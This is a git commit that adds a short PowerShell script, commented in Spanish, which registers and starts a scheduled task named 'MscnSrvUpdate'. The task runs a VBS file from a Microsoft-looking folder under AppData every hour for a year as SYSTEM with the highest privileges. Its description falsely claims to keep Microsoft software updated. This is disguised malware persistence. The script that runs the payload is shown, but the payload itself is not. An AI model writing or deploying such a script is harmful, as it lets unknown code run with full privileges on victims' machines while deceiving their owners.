d9f3fbbfc4e34f03b4a3d9a443b853139553c2ae
emakedie <155691767+emakedie@users.noreply.github.com>
2025-01-15 14:28:05 -0300

    Create Taskasadmin.ps1

---
+++ Taskasadmin.ps1
@@ -0,0 +1,19 @@
+# Eliminar una tarea existente llamada "MscnSrvUpdate"
+Unregister-ScheduledTask -TaskName "MscnSrvUpdate" -Confirm:$false -ErrorAction SilentlyContinue
+
+# Crear una acción para la tarea
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate\Mscntask.vbs"
+
+# Crear un disparador que se ejecute una vez y luego se repita cada hora durante un año
+$trigger = New-ScheduledTaskTrigger -Once -At "00:00AM" -RepetitionInterval (New-TimeSpan -Minutes 60) -RepetitionDuration (New-TimeSpan -Days 365)
+
+# Configuración de la tarea
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable
+
+# Registrar la tarea con la cuenta del sistema (privilegios elevados)
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MscnSrvUpdate" `
+    -Description "Mantiene actualizado el software de Microsoft. Si esta tarea está deshabilitada o detenida, el software de Microsoft no se actualizará." `
+    -Settings $settings -User "SYSTEM" -RunLevel Highest | Out-Null
+
+# Iniciar la tarea programada
+Start-ScheduledTask -TaskName "MscnSrvUpdate"
